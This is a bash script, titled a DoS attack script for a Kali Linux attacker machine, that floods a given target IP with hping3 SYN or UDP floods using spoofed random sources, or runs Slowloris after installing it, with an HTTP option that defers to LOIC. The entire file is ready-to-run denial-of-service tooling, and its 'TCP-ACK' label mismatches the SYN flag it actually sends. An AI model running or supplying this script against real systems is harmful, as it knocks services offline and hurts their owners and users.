#!/bin/bash
# DoS Attack Script
# For Kali Linux VM (Attacker Machine)

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <attack_type>"
    echo "Attack types: tcp, udp, http, slowloris"
    exit 1
fi

TARGET_IP=$1
ATTACK_TYPE=$2

echo "Starting DoS attack of type $ATTACK_TYPE against $TARGET_IP"

case $ATTACK_TYPE in
    tcp)
        echo "Launching TCP-ACK flood attack..."
        sudo hping3 -c 10000 -d 120 -S -p 80 --flood --rand-source $TARGET_IP
        ;;
    udp)
        echo "Launching UDP flood attack..."
        sudo hping3 --udp -p 80 --flood -d 120 $TARGET_IP
        ;;
    http)
        echo "Launching HTTP flood attack using LOIC..."
        # Note: LOIC requires GUI, this is just an example command
        echo "Please run LOIC manually with the following target: $TARGET_IP"
        ;;
    slowloris)
        echo "Launching Slowloris attack..."
        # Install slowloris if not already installed
        if ! command -v slowloris &> /dev/null; then
            echo "Installing slowloris..."
            pip3 install slowloris
        fi
        slowloris $TARGET_IP -p 80 -s 500
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        exit 1
        ;;
esac

echo "Attack completed!"
